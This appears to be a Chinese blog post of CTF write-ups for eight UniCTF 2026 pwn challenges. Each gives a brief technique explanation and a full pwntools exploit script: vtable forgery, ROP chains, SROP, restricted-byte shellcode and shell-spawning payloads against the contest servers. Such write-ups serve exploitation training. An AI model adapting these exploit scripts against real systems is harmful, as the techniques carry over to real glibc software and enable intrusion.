---
title: UniCTF 2026 Pwn 部分题解
published: 2026-01-31
tags: [WriteUp, Pwn]
category: CTF
draft: false
---

还是太菜了，只能出很多人做出的题

似乎有一些有趣的非预期

# EzIO

`fclose`时会调用`_IO_file_finish`

libc版本为2.23，直接伪造vtable

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './EzIO'
elf = ELF(file)
libc = ELF('./2.23-0ubuntu11.3_amd64/libc.so.6')

choice = 1
if choice:
    port =   12205
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

debug('b *0x4011C2')

addr = 0x404060

fake_io = flat(
    {
        0x0: 0xfbad1800,
        0x10: 0x4011CE,     # _IO_file_finish
        0x88: elf.bss(),    # lock writable addr
        0xD8: addr,         # vtable
    },
    filler=b"\x00"
)

s(fake_io)

itr()
```





# Micro?Macro!

初始时在`rand_slot`放置`values`地址，类型为`1`

操作一和操作二结合可以创造指定偏移的地址槽

用操作三任意读，读取`got.puts`获得`libc`地址

用操作四任意写，把`system`槽位类型改为`2`

最后操作五调用`system`

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './vuln'
elf = ELF(file)
libc = ELF('./libc.so.6')

choice = 1
if choice:
    port =   37412
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

opcodes = [0x3a,0x7e,0x91,0x52,0xc4,0x1b,0x68,0xaf]

# handler0：`SET_IMM(i, imm64)`
def op0(arg1, arg2):
    sl(f'inst {opcodes[0]} {arg1} {arg2}'.encode())

# handler1：`ADD(dst, a, b)`
# type[a] == 1
def op1(arg1, arg2, arg3):
    sl(f'inst {opcodes[1]} {arg1} {arg2} {arg3}'.encode())

# handler2：`CMOV_ENTRY(dst, x, y)`
def op2(arg1, arg2, arg3):
    sl(f'inst {opcodes[2]} {arg1} {arg2} {arg3}'.encode())

# handler3：`LOAD(dst, ptr_slot)`
def op3(arg1, arg2):
    sl(f'inst {opcodes[3]} {arg1} {arg2}'.encode())

# handler4：`STORE(ptr_slot, val_slot)`
def op4(arg1, arg2):
    sl(f'inst {opcodes[4]} {arg1} {arg2}'.encode())

# handler5：`CALL(func_slot, arg_slot)`
# type[func_slot] == 2
def op5(arg1, arg2):
    sl(f'inst {opcodes[5]} {arg1} {arg2}'.encode())

# handler6：`PRINT(i)`
def op6(arg1):
    sl(f'inst {opcodes[6]} {arg1}'.encode())

ru(b'> ')
sl(b'dbg')
ru(b'rand_slot = ')
rand_slot = int(rl())
leak('rand_slot')

# op6(rand_slot)
op0(0, -0x138)
op1(1, rand_slot, 0)
op3(2, 1) # puts
op0(0, -0x32180)
op1(2, 2, 0) # system
op0(0, 32)
op1(3, rand_slot, 0)
op0(0, 2)
op4(3, 0)
op0(0, 40)
op1(3, 3, 0)
op0(4, u64(b'/bin/sh\x00'))
op5(2, 3)

debug('brva 0x24CC')

sl(b'run')

itr()

# UniCTF{H4nDrn4d3_VM&013fu5cA7ioN_M33tS_H4Ndcr4F73cl_3><pl01T2005900373570621440}
```





# speak

输入name时溢出，printf泄露libc地址，栈地址，程序地址

然后把printf自身的返回地址改为`add rsp, 0x8; ret`造成重叠，再跳回read，就能写orw的ROP链

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './pwn'
elf = ELF(file)
libc = ELF('./libc.so.6')

choice = 1
if choice:
    port =   39977
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

debug('brva 0x01478\nbrva 0x0014AA')

sa(b'name: ', b'A'*32 + b'%2$p\n%9$p\n%45$p\n')
libc.address = int(rl(), 16) - (libc.sym['_IO_2_1_stdout_'] + 131)
leak('libc.address')
stack = int(rl(), 16) - 0xd8
leak('stack')
pie = int(rl(), 16) - elf.sym['main']
leak('pie')

s(fmtstr_payload(6, {stack-0x8: pie + 0x001016, stack+0x8: pie + 0x001496}))
r(1)

pop_rdi_ret = libc.address + 0x10f78b
pop_rsi_ret = libc.address + 0x110a7d
pop_rbx_ret = libc.address + 0x0586e4
mov_rdx_rbx_pop_3_ret = libc.address + 0x0b0133

payload = flat(
    b"flag".ljust(8, b'\x00'),
    pop_rdi_ret,
    stack,
    pop_rsi_ret,
    0,
    libc.sym['open'],
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    stack,
    pop_rbx_ret,
    0x50,
    mov_rdx_rbx_pop_3_ret,
    0,
    0,
    0,
    libc.sym['read'],
    pop_rdi_ret,
    1,
    pop_rsi_ret,
    stack,
    pop_rbx_ret,
    0x50,
    mov_rdx_rbx_pop_3_ret,
    0,
    0,
    0,
    libc.sym['write']
)
s(payload)

itr()
```





# 什么？我不是汇编高手吗？

利用程序给的长跳跃指令`E9`，`E9 01 00 00 00`即为`jmp $+6`，跳到下一个`E9`后面

用短跳跃指令`EB 01`跳过`E9`，这样每次就有两字节的自由操作

用`pop rax; mov al, 0xFB; mov ah, 0x11; push rax; ret`跳转到后门

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './challenge'
elf = ELF(file)
# libc = ELF('./lib/libc.so.6')

choice = 1
if choice:
    port =   24701
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

debug('b *0x401399')

addr = int(rl(), 16)
leak('addr')

# e9 01 00 00 00           jmp $+6

payload = b'\x01\x00\x00\x00'
payload += asm('pop rax\nnop\njmp $+3')
payload += asm('mov al, 0xFB\njmp $+3')
payload += asm('mov ah, 0x11\njmp $+3')
payload += asm('push rax\nret\njmp $+3')

sl(payload)

itr()
```





# Sur prize

由于`gets`的参数是用`rsp`定位，似乎不能简单的栈迁移

先跳转到`wutihave`获得flag文件名称

`gets`结束后`rdi`会指向一个神秘结构体，此时再`gets`一次就能往这里输入

但是`gets`结束后这个结构体前`0x10`会被清零，此时dil=0x20

这里使用了`add dil, dil`让dil=0x40，成功绕过

指定参数后使用`leimicc`

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './vuln'
elf = ELF(file)
# libc = ELF('./lib/libc.so.6')

choice = 1
if choice:
    port =   21630
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

debug('b *0x401778')

r(0xfff)
r(0xfff)
r(0xfff)

s(b'\n')

get_name = False
if get_name:
    sl(p64(0x401653))
    itr()
    exit()

# 0x00000000004011ea : add dil, dil ; loopne 0x401255 ; nop ; ret

sl(p64(elf.plt['gets']) + p64(0x4011ea) + p64(0x4016A2))

sl(b'\x00'*0x20 + b'flag_d82b9eb327dea6fc67ef26a7bcaf8147')

itr()

# UniCTF{♫♫♫nEv3R_G0nN4_q1v3_Y0u_Up♪♪♪N3V3r_G0NnA_L37_g3t$_D0vvn♫♫♫182008523222735130624}
```





# smcode

[仅用三种字符实现 x86_64 架构的任意 shellcode-安全KER - 安全资讯平台](https://www.anquanke.com/post/id/256530)

shellcode字节必须为斐波那契数列中的项

利用这篇文章可以做到`0x00``0x01``0x05`实现任意shellcode

先造一个`read`，再读入`shellcraft.sh()`，防止生成的shellcode太长

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './pwn'
elf = ELF(file)
# libc = ELF('./lib/libc.so.6')

choice = 1
if choice:
    port =   33506
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

current_eax = 0

def next_step(value):
    """ 每个字节每次加 5、1 或 0 """
    n = 0
    for i in range(4):
        if (value >> (i * 8)) & 0xff >= 5:
            n |= (5 << (i * 8))
        elif (value >> (i * 8)) & 0xff >= 1:
            n |= (1 << (i * 8))
    return n

def add_eax(value):
    """ 将 eax 加上指定的值 """
    payload = b''
    while value > 0:
        n = next_step(value)
        payload += b'\x05' + p32(n)
        value -= n
    return payload

def asm_015(shellcode):
    """ 将 shellcode 转换成 0x00、0x01、0x05 三种字符 """
    # 不足 4 字节的目标指令补充 nop 指令
    if len(shellcode) < 4:
        shellcode = shellcode.ljust(4, b'\x90')
    # 特殊处理超过 4 字节且含有其他字符的目标指令
    if len(shellcode) > 4:
        for c in shellcode[4:]:
            if c not in (0, 1, 5):
                return asm_long_015(shellcode)
    # 当前 eax 距离目标指令的差值
    global current_eax
    eax_offset = u32(shellcode[:4]) - current_eax
    if eax_offset < 0:
        eax_offset += 0x100000000
    # 预留第一步的值，以减少 shellcode 的总体长度
    reserved = next_step(eax_offset)
    eax_offset -= reserved
    # 设置 eax 为目标指令
    payload = add_eax(eax_offset)
    current_eax = (current_eax + eax_offset) & 0xffffffff
    # 将 eax 加到目标指令
    payload += b'\x01\x05\x00\x00\x00\x00'  # add [rip], eax
    # 目标指令预留的值
    payload += p32(reserved)
    # 目标指令超出 4 字节的部分(全是 0x00、0x01、0x05 之一)
    payload += shellcode[4:]
    return payload

def asm_long_015(shellcode):
    """ 将超长的 shellcode 转换成 0x00、0x01、0x05 三种字符(会破坏 rbp 寄存器) """
    # 添加 ret 指令，并补充为 2 的整数倍长度
    shellcode += b'\xC3'
    if len(shellcode) % 2 == 1:
        shellcode += b'\x90'
    # 暂不支持大于等于 0x80 字节的超长指令，尽量将指令拆成 4 字节一组以减少 shellcode 长度
    assert len(shellcode) < 0x80
    # 将 rbx 入栈，往 rbp 处构造出超长 shellcode
    payload = asm_015(b'\x53\x48\x8D\x2D\x00\x00\x00\x00')  # push rbx; lea rbp, [rip]
    for i in range(0, len(shellcode), 2):
        payload += asm_015(b'\x66\xBB' + shellcode[i:i+2])  # mov bx, 0xXXXX
        payload += asm_015(b'\x66\x89\x5D' + bytes([i]))    # mov [rbp + i], bx
    # 将 rbx 出栈，调用 rbp 处的超长 shellcode
    payload += asm_015(b'\x5B\xFF\xD5\x90')                 # pop rbx; call rbp; nop
    return payload

# debug('brva 0x001461')

ru(b'shellcode\n')

sc = asm_015(asm('push 0'))
sc += asm_015(asm('push rbx'))
sc += asm_015(asm('push 0x1000'))
sc += asm_015(asm('pop rdx'))
sc += asm_015(asm('pop rsi'))
sc += asm_015(asm('pop rax; syscall'))

s(sc)

ru(b'[+]\n')

s(b'\x90'*0x45c + asm(shellcraft.sh()))

itr()
```





# 简单的pwn

输出栈上指定偏移的5字节，泄露libc地址（因为按0x1000对齐）

在任意位置读入`0xC0`，打`fsop`应该是不够的，无法同时搞定`_flags`和`vtable`

打`eop`，在`.fini_array`存储的函数地址下断点，反向追踪libc中存储地址的位置

执行到这里的时候，`rbp`就指向起始点，可以用`leave; ret`栈迁移执行ROP链（one gadget都不好用）

实验发现，对应位置的0x18地址不能修改，所以用`pop rdi; pop rbp; ret`跳过这里

值得注意的是，开启aslr和不开启aslr的时候，这个地址与libc基地址的偏移是不一样的

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './PWN'
elf = ELF(file)
libc = ELF('./libc.so.6')

choice = 1
if choice:
    port =   26476
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file, aslr=True)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

# debug('brva 0x00124E')
# debug('brva 0x12D0')
# debug('b *0x155555522e65\n')
# debug('b g2')

s(p64(0x29))

libc.address = uu64(b'\xa8'+r(5)) - 0x29ca8
leak('libc.address')

addr = libc.address + 0x22f310 - 0x8
leak('addr')

s(p64(addr))

payload = flat({
    0x0: libc.address + 0x054c47,                   # leave; ret
    0x8: addr-0x3da0,
    # 0x10: libc.address + 0xfb062
    # 0x10: libc.address + 0x02a145,
    0x10: libc.address + 0x02a33c,                  # pop rdi; pop rbp; ret
    0x18: libc.search(b'/bin/sh\x00').__next__(),
    0x20: libc.address + 0x22f8f0,
    0x28: libc.sym['system']
}, filler=b'\x00')

s(payload)

itr()
```





# shadow

程序对信号`11` (`SIGSEGV`)实现了自定义处理，而`handler`函数栈帧下方就是保存的寄存器等信息，利用`shadow`还原返回地址就可以无限`srop`

首先用第一个`read`对`rbp`进行偏移（一个`1/16`的爆破），使得第二个`read`指向自身的返回地址，此时再进入`sub_1460`但跳过`push rbp; mov rbp, rsp`，就可以让`shadow`保存一个返回地址为`0`

故技重施，这次第二个`read`维持原本的程序流，`printf`泄露出程序基址，然后`shadow`将返回地址设置为`0`，触发`SIGSEGV`，进入`handler`

之后再用`printf`泄露libc基址，然后orw

```python
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './pwn'
elf = ELF(file)
libc = ELF('./libc.so.6')

choice = 1
if choice:
    port =   25854
    target = 'nc1.ctfplus.cn'
    p = remote(target, port)
else:
    p = process(file, aslr=False)

io = p

def debug(cmd=''):
    if choice==1:
        return
    gdb.attach(p, gdbscript=cmd)


s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
sa      = lambda x,data             :p.sendafter(x, data)
sla     = lambda x,data             :p.sendlineafter(x, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
uru64   = lambda                    :uu64(ru('\x7f')[-6:])
leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))

# debug('handle SIGSEGV pass\nbrva 0x145E')

s(b'A'*0x10 + b'\x60')

sleep(0.5)

s(b'\x68')

sleep(0.5)

# debug('handle SIGSEGV pass\nbrva 0x145E')

s(b'A'*0x10 + b'\x50')

# debug('handle SIGSEGV pass\nbrva 0x15D4')

sleep(0.5)

s(b'\xee')

sleep(0.5)

pie = uu64(r(6)) - 0x1509
leak('pie')

bss = pie + elf.bss(0x800)
leak('bss')

frame = SigreturnFrame()
frame.rip = pie + 0x0014F5
frame.rsi = pie + 0x003FB8
frame.rsp = bss

s(b'A'*0x20 + bytes(frame) + p64(0))

libc.address = uu64(r(6)) - libc.sym['read']
leak('libc.address')

# debug('handle SIGSEGV pass\nb open')

# frame = SigreturnFrame()
# frame.rip = pie + 0x0014F5
# frame.rsi = libc.address + 0x20ad58
# frame.rsp = bss

# s(b'A'*0x20 + bytes(frame) + p64(0))

# stack = uu64(r(6))
# leak('stack')

sleep(0.5)

frame = SigreturnFrame()
frame.rip = libc.sym['open']
frame.rdi = bss - 0x5c0
frame.rsi = 0
frame.rsp = bss

s(b'/flag'.ljust(0x20, b'\x00') + bytes(frame) + p64(0))

frame = SigreturnFrame()
frame.rip = libc.sym['read']
frame.rdi = 3
frame.rsi = bss + 0x100
frame.rdx = 0x50
frame.rsp = bss

s(b'A'*0x20 + bytes(frame) + p64(0))

frame = SigreturnFrame()
frame.rip = libc.sym['write']
frame.rdi = 1
frame.rsi = bss + 0x100
frame.rdx = 0x50
frame.rsp = bss

s(b'A'*0x20 + bytes(frame) + p64(0))


itr()
```

